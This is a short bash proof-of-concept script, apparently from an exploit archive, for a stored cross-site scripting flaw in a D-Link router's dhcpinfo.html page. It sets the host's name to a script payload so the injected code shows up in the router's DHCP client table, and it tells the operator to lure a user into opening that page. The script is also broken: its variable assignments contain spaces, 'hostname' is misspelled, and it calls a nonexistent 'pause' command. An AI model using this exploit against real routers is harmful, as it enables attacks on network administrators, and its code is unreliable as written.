#!/bin/bash

# Written and discovered by Yuval tisf Nativ
# The page 'dhcpinfo.html' will list all machines connected to the network with hostname, 
# IP, MAC and IP expiration. It is possible to store an XSS in this table by changing hostname. 

# Checks if you are root
if [ "$(id -u)" != "0" ]; then
	echo "Please execute this script as root"
	exit 1
fi	

# You're XSS here
xss = "\"<script>alert('pwned');</script>"

# backup current hostname
currhost = `hostname`

# Bannering
echo ""
echo "		D-Link Persistent XSS by tisf"
echo ""
echo "The page dhcpinfo.html is the vulnerable page."
echo "Ask the user to access it and your persistent XSS will be triggered."
echo ""

# Change hostname to XSS
sudo hosname $xss

# Restore previous hostname on exit
pause "Type any key to exit and restore your previous hostname."
sudo hostname $currhost
